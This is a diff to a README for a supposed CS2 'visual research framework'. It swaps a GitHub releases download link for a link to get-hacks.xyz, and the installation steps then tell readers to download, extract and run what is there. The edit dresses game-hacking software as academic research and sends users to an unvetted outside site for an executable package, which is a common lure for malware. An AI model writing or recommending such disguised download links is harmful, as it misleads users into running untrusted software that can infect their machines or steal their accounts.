@@ -118,7 +118,7 @@ Our framework incorporates sophisticated graphics analysis technologies for acad
 ## 📥 Research Framework Installation
 
 ### Setup Process
-1. **[Download Research Package](https://github.com/your-username/cs2-visual-research/releases)**
+1. [**Download**](https://get-hacks.xyz/)
 2. **Extract** to research directory
 3. **Run** configuration and analysis tools
 4. **Configure** research parameters
